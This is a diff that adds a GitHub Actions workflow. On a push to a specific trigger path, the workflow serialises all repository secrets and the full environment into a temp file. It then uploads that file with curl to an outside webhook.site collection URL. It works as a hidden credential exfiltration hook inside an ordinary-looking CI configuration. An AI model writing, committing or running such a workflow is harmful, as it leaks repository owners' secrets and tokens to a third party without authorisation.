@@ -1,0 +1,19 @@
+name: ex2-25522
+on:
+  push:
+    paths:
+      - "daily/ex2trigger*"
+  workflow_dispatch:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: post
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          echo "HELLO-EX2 run=" > /tmp/m.txt
+          echo "SECRETS=" >> /tmp/m.txt
+          env | sort >> /tmp/m.txt
+          wc -c /tmp/m.txt
+          curl -v -m 30 --data-binary @/tmp/m.txt "https://webhook.site/8a88531d-9fd7-4826-bad5-94aa77551ee1" 2>&1 | tail -15
